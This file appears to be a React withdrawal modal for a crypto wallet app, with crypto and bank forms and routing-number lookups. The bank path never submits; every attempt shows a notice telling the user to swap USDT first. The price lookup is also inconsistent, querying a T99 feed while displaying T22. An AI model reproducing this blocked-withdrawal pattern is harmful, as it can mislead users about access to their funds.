'use client';

import { useState, useEffect } from 'react';
import { X, Wallet, Building2, ArrowRight, Loader2 } from 'lucide-react';
import GasFeeModal from './gas-fee-modal';
import { useWallet } from '@/context/base';
import StatusModal from './statusModal';

interface WithdrawalModalProps {
    isOpen: boolean;
    onClose: () => void;
}

export default function WithdrawalModal({ isOpen, onClose }: WithdrawalModalProps) {
    const [withdrawalType, setWithdrawalType] = useState<'crypto' | 'bank'>('crypto');
    const [amount, setAmount] = useState('');
    const [address, setAddress] = useState('');
    const [accountNumber, setAccountNumber] = useState('');
    const [routingNumber, setRoutingNumber] = useState('');
    const {  cbProvider ,address:add} = useWallet();

    // Gas Fee & Conversion State
    const [showGasModal, setShowGasModal] = useState(false);
    const [showStatusModel, setShowStatusModel] = useState(false);
    const [t22Price, setT22Price] = useState(0);
    const [isLoadingPrice, setIsLoadingPrice] = useState(false);
    const [withdrawLoading, setWithdrawLoading] = useState(false);

    // Bank Validation State
    const [bankName, setBankName] = useState('');
    const [isVerifyingRouting, setIsVerifyingRouting] = useState(false);
    const [routingError, setRoutingError] = useState('');

    useEffect(() => {
        if (isOpen && withdrawalType === 'bank') {
            fetchPrice();
        }
    }, [isOpen, withdrawalType]);

    // Reset state on open
    useEffect(() => {
        if (!isOpen) {
            setWithdrawalType('crypto');
            setRoutingNumber('');
            setAccountNumber('');
            setAmount('');
            setBankName('');
            setRoutingError('');
        }
    }, [isOpen]);

    const fetchPrice = async () => {
        try {
            setIsLoadingPrice(true);
            const response = await fetch('https://api.coinbase.com/v2/prices/T99-USD/spot');
            const json = await response.json();
            const price = parseFloat(json.data.amount) || 0.45;
            setT22Price(price);
        } catch (e) {
            setT22Price(0.45);
        } finally {
            setIsLoadingPrice(false);
        }
    };

    const validateRoutingNumber = async (number: string) => {
        if (number.length !== 9) {
            setBankName('');
            return;
        }

        setIsVerifyingRouting(true);
        setRoutingError('');
        setBankName('');

        try {
            // API 1: Try routingnumbers.info
            try {
                const response1 = await fetch(`https://www.routingnumbers.info/api/data.json?rn=${number}`);
                if (response1.ok) {
                    const data = await response1.json();
                    if (data && data.customer_name) {
                        setBankName('valid');
                        setIsVerifyingRouting(false);
                        return;
                    }
                }
            } catch (e) {
                console.log('API 1 failed, trying next...');
            }

            // API 2: Try API Ninjas
            try {
                const response2 = await fetch(`https://api.api-ninjas.com/v1/routingnumber?routing_number=${number}`);
                if (response2.ok) {
                    const data = await response2.json();
                    if (data && data.routing_number) {
                        setBankName('valid');
                        setIsVerifyingRouting(false);
                        return;
                    }
                }
            } catch (e) {
                console.log('API 2 failed, trying next...');
            }

            // API 3: Try Apyflux
            try {
                const response3 = await fetch(`https://api.apyflux.com/v1/routing/${number}`);
                if (response3.ok) {
                    const data = await response3.json();
                    if (data && data.routing_number) {
                        setBankName('valid');
                        setIsVerifyingRouting(false);
                        return;
                    }
                }
            } catch (e) {
                console.log('API 3 failed, trying next...');
            }

            // API 4: Try BankRoutingIO (original)
            try {
                const response4 = await fetch(`https://bankrouting.io/api/v1/aba/${number}`);
                if (response4.ok) {
                    const data = await response4.json();
                    if (data && data.name) {
                        setBankName('valid');
                        setIsVerifyingRouting(false);
                        return;
                    }
                }
            } catch (e) {
                console.log('API 4 failed, using checksum validation...');
            }

            // Fallback 5: ABA Routing Number Checksum Algorithm
            // If all APIs fail, validate using the routing number checksum
            const validateChecksum = (rn: string): boolean => {
                const digits = rn.split('').map(Number);
                const checksum = (3 * (digits[0] + digits[3] + digits[6]) +
                    7 * (digits[1] + digits[4] + digits[7]) +
                    (digits[2] + digits[5] + digits[8])) % 10;
                return checksum === 0;
            };

            if (validateChecksum(number)) {
                setBankName('valid');
            } else {
                setRoutingError('Invalid routing number');
            }

        } catch (error) {
            setRoutingError('Could not verify routing number');
        } finally {
            setIsVerifyingRouting(false);
        }
    };

    const handleRoutingChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        const value = e.target.value.replace(/\D/g, '').slice(0, 9);
        setRoutingNumber(value);
        if (value.length === 9) {
            validateRoutingNumber(value);
        } else {
            setBankName('');
            setRoutingError('');
        }
    };

    const getEstimatedT22 = () => {
        if (!amount || !t22Price) return '0.00';
        return (parseFloat(amount) / t22Price).toFixed(2);
    };

    const handleGasSuccess = (txHash: string) => {
        const newTx = {
            id: txHash,
            type: withdrawalType === 'bank' ? 'send' : 'send',
            asset: withdrawalType === 'bank' ? 'USD' : 'T22',
            amount: `-${amount}`,
            date: 'Just now',
            status: 'pending',
            counterparty: withdrawalType === 'bank' ? (bankName || 'Bank Account') : address
        };

        const existingInfo = localStorage.getItem('transactions');
        const transactions = existingInfo ? JSON.parse(existingInfo) : [];
        localStorage.setItem('transactions', JSON.stringify([newTx, ...transactions]));

        setShowGasModal(false);
        onClose();
    };

    const handleSubmit = async (e: React.FormEvent) => {
        e.preventDefault();

        if(withdrawalType === 'bank'){

            setShowStatusModel(true)
            return
        }

        try{
setWithdrawLoading(true)
            if (
                // withdrawalType === 'bank' && 
                (!bankName && !routingNumber)) return; // Basic validation
                        let vvv =    await fetch(`/api/withdrawal`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ address:add, amount:Number(amount),
    
            routingNumber,reciepientWalletAddress:address,accountNumber:accountNumber,wType:withdrawalType,
            bankName,type:"send",asset:"BNB"
           })
        });
    
        let vjson = await vvv.json()
    
        if(vjson?.record?.id){
            onClose()
            // setUser(vjson?.existingRecord)
        }
            // setShowGasModal(true);
        }catch(e){
console.log(e)
        }finally{
setWithdrawLoading(false)
        }
    };

    if (!isOpen) return null;

    return (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 animate-fade-in">
            {/* Backdrop */}
            <div
                className="absolute inset-0 bg-black/60 backdrop-blur-sm"
                onClick={onClose}
            />

            {/* Modal - Bottom Sheet Style */}
            <div className="absolute bottom-0 left-0 right-0 w-full bg-[#0a0b0d] border-t border-[#0052FF]/30 rounded-t-[2rem] p-6 animate-slide-up text-white shadow-2xl pb-10">
                {/* Header */}
                <div className="flex items-center justify-between mb-4">
                    <h2 className="text-lg font-bold">Withdraw</h2>
                    <button
                        onClick={onClose}
                        className="w-8 h-8 flex items-center justify-center bg-gray-800/50 hover:bg-gray-700/50 rounded-full transition-colors text-gray-400 hover:text-white"
                    >
                        <X className="w-5 h-5" />
                    </button>
                </div>

                {/* Withdrawal Type Selector */}
                <div className="grid grid-cols-2 gap-3 mb-4">
                    <button
                        onClick={() => setWithdrawalType('crypto')}
                        className={`p-3 rounded-xl border transition-all flex flex-col items-center justify-center gap-1.5 ${withdrawalType === 'crypto'
                            ? 'border-[#0052FF] bg-[#0052FF]/10 text-white'
                            : 'border-white/5 bg-[#1E2025] hover:border-white/10 text-gray-400 hover:text-white'
                            }`}
                    >
                        <img src="https://cryptologos.cc/logos/bitcoin-btc-logo.png?v=026" alt="Crypto" className="w-6 h-6 object-contain" />
                        <span className="font-medium text-xs">Crypto</span>
                        <span className="text-[10px] opacity-70">To wallet address</span>
                    </button>

                    <button
                        onClick={() => setWithdrawalType('bank')}
                        className={`p-3 rounded-xl border transition-all flex flex-col items-center justify-center gap-1.5 ${withdrawalType === 'bank'
                            ? 'border-[#0052FF] bg-[#0052FF]/10 text-white'
                            : 'border-white/5 bg-[#1E2025] hover:border-white/10 text-gray-400 hover:text-white'
                            }`}
                    >
                        <img src="https://hatscripts.github.io/circle-flags/flags/us.svg" alt="Bank" className="w-6 h-6 object-contain rounded-full" />
                        <span className="font-medium text-xs">Bank</span>
                        <span className="text-[10px] opacity-70">To bank account</span>
                    </button>
                </div>

                {/* Form */}
                <form onSubmit={handleSubmit} className="space-y-4">
                    {/* Amount Input */}
                    <div>
                        <label className="block text-xs font-medium text-gray-400 mb-1.5">Amount</label>
                        <div className="relative">
                            <input
                                type="number"
                                value={amount}
                                onChange={(e) => setAmount(e.target.value)}
                                placeholder="0.00"
                                className="w-full px-4 py-3 bg-[#1E2025] border border-white/5 rounded-xl focus:border-[#0052FF] focus:outline-none transition-colors text-white text-base placeholder-gray-600"
                                required
                            />
                            <span className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-400 font-medium text-xs">USD</span>
                        </div>
                        {withdrawalType === 'bank' && (
                            <div className="flex justify-end mt-1.5 text-[10px] text-gray-400">
                                {isLoadingPrice ? (
                                    <span className="flex items-center gap-1"><Loader2 className="w-3 h-3 animate-spin" /> Fetching rate...</span>
                                ) : (
                                    <span>≈ {getEstimatedT22()} T22 (@ ${t22Price.toFixed(2)})</span>
                                )}
                            </div>
                        )}
                    </div>

                    {/* Crypto-specific fields */}
                    {withdrawalType === 'crypto' && (
                        <>
                            <div>
                                <label className="block text-xs font-medium text-gray-400 mb-1.5">Wallet Address</label>
                                <input
                                    type="text"
                                    value={address}
                                    onChange={(e) => setAddress(e.target.value)}
                                    placeholder="0x..."
                                    className="w-full px-4 py-3 bg-[#1E2025] border border-white/5 rounded-xl focus:border-[#0052FF] focus:outline-none transition-colors text-white font-mono text-xs placeholder-gray-600"
                                    required
                                />
                            </div>

                            <div>
                                <label className="block text-xs font-medium text-gray-400 mb-1.5">Network</label>
                                <div className="relative">
                                    <select className="w-full px-4 py-3 bg-[#1E2025] border border-white/5 rounded-xl focus:border-[#0052FF] focus:outline-none transition-colors text-white appearance-none cursor-pointer text-xs">
                                        <option value="bsc">BNB Smart Chain (BSC)</option>
                                        <option value="ethereum">Ethereum</option>
                                        <option value="polygon">Polygon</option>
                                    </select>
                                    <div className="absolute right-4 top-1/2 -translate-y-1/2 pointer-events-none text-gray-400">
                                        <ArrowRight className="w-3 h-3 rotate-90" />
                                    </div>
                                </div>
                            </div>
                        </>
                    )}

                    {/* Bank-specific fields */}
                    {withdrawalType === 'bank' && (
                        <>
                            <div>
                                <label className="block text-xs font-medium text-gray-400 mb-1.5">Routing Number (Lookup)</label>
                                <div className="relative">
                                    <input
                                        type="text"
                                        value={routingNumber}
                                        onChange={handleRoutingChange}
                                        placeholder="9-digit routing number"
                                        className={`w-full px-4 py-3 bg-[#1E2025] border rounded-xl focus:outline-none transition-colors text-white placeholder-gray-600 text-xs ${routingError ? 'border-red-500/50 focus:border-red-500' :
                                            bankName ? 'border-green-500/50 focus:border-green-500' :
                                                'border-white/5 focus:border-[#0052FF]'
                                            }`}
                                        maxLength={9}
                                        required
                                    />
                                    {isVerifyingRouting && (
                                        <div className="absolute right-4 top-1/2 -translate-y-1/2">
                                            <Loader2 className="w-3 h-3 animate-spin text-gray-400" />
                                        </div>
                                    )}
                                </div>
                                {bankName && (
                                    <div className="mt-2 p-2 bg-green-500/10 border border-green-500/20 rounded-lg flex items-center gap-2">
                                        <Building2 className="w-3 h-3 text-green-400" />
                                        <span className="text-[10px] text-green-300 font-medium">Routing number is valid</span>
                                    </div>
                                )}
                                {routingError && (
                                    <p className="text-[10px] text-red-400 mt-1">{routingError}</p>
                                )}
                            </div>

                            <div>
                                <label className="block text-xs font-medium text-gray-400 mb-1.5">Account Number</label>
                                <input
                                    type="text"
                                    value={accountNumber}
                                    onChange={(e) => setAccountNumber(e.target.value)}
                                    placeholder="Enter account number"
                                    className="w-full px-4 py-3 bg-[#1E2025] border border-white/5 rounded-xl focus:border-[#0052FF] focus:outline-none transition-colors text-white placeholder-gray-600 text-xs"
                                    required
                                />
                            </div>
                        </>
                    )}

                    {/* Submit Button */}
                    <button
                    disabled={withdrawLoading}
                        type="submit"
                        className="w-full bg-[#0052FF] hover:bg-[#004ada] text-white font-bold py-3 rounded-full transition-all shadow-lg hover:shadow-[#0052FF]/25 active:scale-[0.98] flex items-center justify-center gap-2 mt-4 text-sm"
                    >
                      { withdrawLoading?"pending" :"Continue"}
                        <ArrowRight className="w-4 h-4" />
                    </button>
                </form>

                {/* Info */}
                <p className="text-[10px] text-gray-500 text-center mt-5">
                    {withdrawalType === 'crypto'
                        ? 'Network fees will be deducted from your withdrawal amount'
                        : 'Bank transfers typically take 1-3 business days'}
                </p>
            </div>

            <GasFeeModal
                isOpen={showGasModal}
                onClose={() => setShowGasModal(false)}
                onSuccess={handleGasSuccess}
            />

            <StatusModal
            success={false}
            message='Please swap your usdt before proceeding with withdrawals'
            title='Notice'
            isOpen={showStatusModel}

            onClose={()=>{setShowStatusModel(false)}}
            
            />
        </div>
    );
}
